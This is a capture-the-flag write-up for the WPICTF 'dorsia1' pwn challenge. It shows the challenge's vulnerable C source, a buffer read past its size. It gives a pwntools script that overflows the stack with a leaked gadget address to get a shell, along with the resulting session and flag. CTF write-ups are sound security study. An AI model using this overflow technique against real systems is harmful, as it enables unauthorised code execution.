# pwn - dorsia1

## Challenge
http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm The first
card.

nc dorsia1.wpictf.xyz 31337 or 31338 or 31339

made by: awg

Hint: Same libc as dorsia4, but you shouldn't need the file to solve.

## Solution
The first card:
```
#include <stdio.h>
#include <stdlib.h>

void main()
{
  char a[69];
  printf("%p\n", system+765772);
  fgets(a, 96, stdin);
}
```

Solution:
```
#!/usr/bin/env python3

from pwn import *

HOST = 'dorsia1.wpictf.xyz'
PORT = 31337

r = remote (HOST, PORT)
addr = r.recvline().rstrip()
print(addr)

p = b''
p += b'A' * 77
p += p64(int(addr,16))

r.sendline(p)

r.interactive()
```

```
[+] Opening connection to dorsia1.wpictf.xyz on port 31337: Done
b'0x771e7023a38c'
[*] Switching to interactive mode
$ ls
flag.txt
nanobuf
run_problem.sh
$ cat flag.txt
WPI{FEED_ME_A_STRAY_CAT}
```

## Flag
```
WPI{FEED_ME_A_STRAY_CAT}
```
